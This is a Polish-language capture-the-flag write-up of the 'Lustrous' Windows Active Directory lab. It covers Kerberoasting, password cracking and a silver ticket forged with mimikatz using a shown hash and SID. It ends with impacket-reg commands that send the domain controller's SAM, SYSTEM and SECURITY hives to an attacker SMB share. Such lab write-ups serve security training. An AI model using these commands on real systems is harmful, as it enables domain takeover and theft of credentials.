# Lustrous
Windows, Medium, created by **xct**

![lustrous_slide](https://github.com/user-attachments/assets/2a572276-9322-44d1-8382-1f8b102c876e)

```
Nmap scan report for 10.10.214.133
Host is up (0.032s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_12-26-21  11:50AM       <DIR>          transfer
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-17 09:23:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Subject Alternative Name: DNS:LusDC.lustrous.vl
| Issuer: commonName=LusDC.lustrous.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-26T09:46:02
| Not valid after:  2022-12-26T00:00:00
| MD5:   ab7f:dbe0:a374:2b3b:2329:81ee:fa00:8bb6
|_SHA-1: 6317:3ae3:9a2d:e8a4:fe27:69e0:01b6:1dbc:3868:5a1a
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Issuer: commonName=LusDC.lustrous.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-16T08:52:52
| Not valid after:  2025-06-17T08:52:52
| MD5:   ba62:6668:7073:374f:1c45:56c0:df2c:079c
|_SHA-1: bbd2:c1c8:26bb:33ea:62d7:bea0:5017:9690:5237:2366
|_ssl-date: 2024-12-17T09:25:02+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
65083/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65084/tcp open  msrpc         Microsoft Windows RPC
65123/tcp open  msrpc         Microsoft Windows RPC
65139/tcp open  msrpc         Microsoft Windows RPC

53/udp  open  domain       Simple DNS Plus
|_dns-recursion: Recursion appears to be enabled
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-17 08:56:35Z)
123/udp open  ntp          NTP v3
```

```
Nmap scan report for 10.10.214.134
Host is up (0.032s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LusMS.lustrous.vl
| Issuer: commonName=LusMS.lustrous.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-16T08:52:50
| Not valid after:  2025-06-17T08:52:50
| MD5:   0e56:6477:8d4c:3f27:dbe1:75f9:7f89:bcd8
|_SHA-1: fde8:b37b:68c8:1b96:b183:31bc:b57e:e0f3:b8ae:7800
|_ssl-date: 2024-12-17T09:25:00+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
```

to po kolei portami. 

### FTP

![{4CC75F64-AD6F-4F74-B68C-ED91ACD88568}](https://github.com/user-attachments/assets/c45e8609-d156-4b18-b8ba-31bc9c8e8fd2)

dało nam trzech userów
```
ben.cox
rachel.parker
tony.ward
wayne.taylor
```

![{87FD9CAC-4B98-405F-AE24-76CEE5A7DF07}](https://github.com/user-attachments/assets/1be07cb8-998f-480c-b0d6-db72e1874bc9)

Ben ma pliczek z `users.csv`, ale wygląda on bardziej na grupy.

![{37D51DFB-3F93-49F1-926B-3329DA71616D}](https://github.com/user-attachments/assets/8bdeffeb-1fd1-4f55-bd5b-3dc6886e3712)

pozostali nie mają nic.

### LDAP

![{AF486A5E-A795-4627-B2B3-C5812CF27C27}](https://github.com/user-attachments/assets/8259d0d1-6710-47b2-93a1-c6dc6383abfb)

### SMB

![{A0309FF9-3052-440A-A1DE-C1B1F14350B1}](https://github.com/user-attachments/assets/16499e34-d16c-4ada-a36b-a532e0dbe988)

ciekawe jest to, że jeden ma smb signing na False.

HMMM
To może asproasting

![{C8A61CEE-0A6D-4C1E-BD8F-6D3895A87482}](https://github.com/user-attachments/assets/ead77d13-9085-41cf-acec-16ca8dec6bec)

bingo. Niby to było oczywiste, ale nie pomyślałem od razu.

![hash](https://github.com/user-attachments/assets/1b5ece3c-1089-44d8-8fbb-183b333485e8)

![{B0CF3875-5F6F-4EDF-A25A-A6746CD52EF5}](https://github.com/user-attachments/assets/74661ada-4816-4d04-810e-376501fd62b5)

trochę enumeracji po shareach, ale nic ciekawego.

![{F4FF7C2F-6EDD-471A-AFB4-19A1A50ABFB6}](https://github.com/user-attachments/assets/7c975a81-a719-461f-a59d-5d696f4f636b)

```
bloodhound-python -d 'lustrous.vl' -u 'ben.cox' -p '<SAM SOBIE ZNAJDŹ>' -ns 10.10.214.133 -dc LusDC.lustrous.vl -c all
```

W międzyczasie jeszcze sobie zerknąłem czy po winrm mamy wjazd i.. mamy :D

![{B0F3774C-3E15-47A7-9681-7C6DE60F1E86}](https://github.com/user-attachments/assets/444e835e-c581-4d2d-b5cd-857f79466962)

jedne co widzę ciekawe tutaj to przynależność do grupki `it`

![{4A317C89-9C62-4351-AECC-D882FEBC7ED9}](https://github.com/user-attachments/assets/db59e7bb-37e2-4ed6-926e-06925a30e47f)

mamy 2 konta serwisowe z kerberoastingu. Sprawdzę czy mają proste hasła.

![{A3BA863B-F782-4D7E-BDF2-CD5D70D4007B}](https://github.com/user-attachments/assets/18e1b46b-02a0-437d-8036-a96e72c8095e)

- o jedno się złamało. Do konta `svc_web`.

Trochę poklikałem i widzę +- gdzie iść, ale wróćmy do tego hosta. To konto serwisowe będzie pewnie do kolejnych eskalacji.

![{F0BD54D0-BEAB-42D2-AAD6-D18EB32A8EC7}](https://github.com/user-attachments/assets/f80d7c43-e018-4778-be7f-de5508f12dbd)

mamy jakiś Hasełko admina na pulpicie.

![{063CD44F-B7D0-4F9A-98CA-CA2F50D71D46}](https://github.com/user-attachments/assets/b430e738-fa47-4aae-b2f6-9eba3e5eadf0)

a użyłem AI do pomocy.

![admin](https://github.com/user-attachments/assets/aef25415-635e-4dd1-9d09-888991e2ba48)

wygląda git

![dziala](https://github.com/user-attachments/assets/960a1fd5-b2ee-4e24-a1f6-9afc46159e17)

I do tego działa. Fajnie. Jeden host zaliczony

## DC
I teraz zapewne użyjemy naszego konta servisowego.
Spróbuję klasycznie czyli silver ticket.

```
impacket-getTGT lustrous.vl/ben.cox:<pass> -dc-ip 10.10.214.133 
```

![{DC61D56D-DEBB-4E7A-BA21-D57736589FCE}](https://github.com/user-attachments/assets/a005d0fb-9238-4e32-9c01-800d9807081f)

teraz spróbujemy zrobić coś na naszej stronce, ale używając kerberous auth.

![{50304FBC-91B7-4E4D-B6C1-41FE9D70A887}](https://github.com/user-attachments/assets/c5f7751a-43ae-4eb1-b386-50ce3b6e0837)

![{FAE7EF69-047B-4201-9584-AAEA2E20DD8E}](https://github.com/user-attachments/assets/8d2d563c-d999-4613-b65e-b450e571edc4)

```
curl --negotiate -u: http://lusdc.lustrous.vl/Internal -k
```

![{663BE480-224A-4A09-AA48-24681F23F024}](https://github.com/user-attachments/assets/9020d9f2-af87-4a59-9258-cf8799193333)

`Activate Kerberos Authentication on IIS`

no i tutaj mogłoby wydawać się, że nie wiemy o jakiego usera nam chodzi, ale my to dobrze wiemy :D

![{360B753E-A184-409D-A059-80ADD9B1F215}](https://github.com/user-attachments/assets/1a07fcb5-727d-4490-b4b2-4499655e3ad3)

`Shorted path to high value targets`

![{2422E005-432C-415D-A84A-8BDE783E6C71}](https://github.com/user-attachments/assets/0158301e-73d9-45c3-938a-17a4417b842b)

tony.ward

![{E9A9652C-DBA9-4874-BE5B-36566CC8C736}](https://github.com/user-attachments/assets/07793899-62d9-401d-bf69-bdd13b3ee1d3)

to się nam przyda zaraz
```
S-1-5-21-2355092754-1584501958-1513963426-1114
```

ten hash to jest ntlm z hasła svc_web.

![haszyk](https://github.com/user-attachments/assets/a208b341-eeac-4379-b076-9b3c01b44e7d)

![{82EBFC4B-5909-4BF8-9903-701E684D874E}](https://github.com/user-attachments/assets/f129b926-a66d-4870-9f07-1f885435ab2f)

ale co ciekawe dostępów teraz brak :O

Wróćmy się na maszynę i poawimy się mimikatzem zatem (fajne moduły ma).
- ale żeby działał bez problemów trzeba defendera wyłączyć + mieć sesję interkatywną więc winrm odpada

```
git clone https://github.com/ParrotSec/mimikatz.git
xfreerdp /v:10.10.214.134 /u:Administrator /p:'<the long password>' /drive:mimikat
```

![{4213D4BF-29F4-4105-8E7C-D7220AA6939D}](https://github.com/user-attachments/assets/7a5f441a-7bf5-4928-9480-7fe7fc912a9d)

![{EAAB049A-BC42-468D-A9C0-D381E9BA4BD9}](https://github.com/user-attachments/assets/405ae91d-b5b5-40f5-af0a-e5e8d55ac63a)

![{E27EAE15-A7EB-419C-8650-0F1A81DBC259}](https://github.com/user-attachments/assets/39562908-3f2e-4b07-9aaa-ab338feb117c)

![{1AA70B5B-37A1-4149-BB9A-92679F180931}](https://github.com/user-attachments/assets/91686db5-2f16-41b2-be1c-65a9b01af6a0)

```
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /target:LusDC.lustrous.vl /id:1114 /service:http/lusdc.lustrous.vl /ptt
```

![{3FEADEEC-076A-4AA6-ABED-AFE53A169098}](https://github.com/user-attachments/assets/f1243f1c-3b7b-4b38-8ffa-35e9e868b887)

![{C7067B94-B4E5-4168-8DF5-2A962B273373}](https://github.com/user-attachments/assets/8de5c180-848e-4596-86fa-7a3da988cf0c)

![{54164039-44D7-4B94-A8DC-3C0510E22C28}](https://github.com/user-attachments/assets/328fc699-658f-406c-ad5d-d87fe7cfe6c1)


iiii coś zrobiłem źle. Jeszcze raz

dobra lekko zmieniłem komendy i magicznie działa.
```
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt
exit
(iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content
```

![pass](https://github.com/user-attachments/assets/be971301-068e-4905-9d7f-471378de8f2a)

I wiemy, że nasz user ma uprawnienia do backupu na DC, ale nie mamy dostepu do DC po shellu, ale.. znamy sztuczki :D

```
impacket-smbserver smb . -smb2support

impacket-reg lustrous.vl/'tony.ward':'< heheheh nope>'@10.10.214.133 save -keyName 'HKLM\SAM' -o \\\\10.8.4.124\\smb
impacket-reg lustrous.vl/'tony.ward':'< heheheh nope>'@10.10.214.133 save -keyName 'HKLM\SYSTEM' -o \\\\10.8.4.124\\smb
impacket-reg lustrous.vl/'tony.ward':'< heheheh nope>'@10.10.214.133 save -keyName 'HKLM\SECURITY' -o \\\\10.8.4.124\\smb
```
- SYSTEM i SECURITY trochę trwa więc to się nie zacieło tylko tak wolno się przesyła.

![final](https://github.com/user-attachments/assets/57315175-f4a8-436c-86db-947a6575a7df)

![{16222F8B-F513-4B64-8FEF-225ED08D5173}](https://github.com/user-attachments/assets/6ebc5d2f-66d9-4920-beef-419839063e65)

![final2](https://github.com/user-attachments/assets/914bdfc8-bdc3-4488-a580-24a0970828aa)
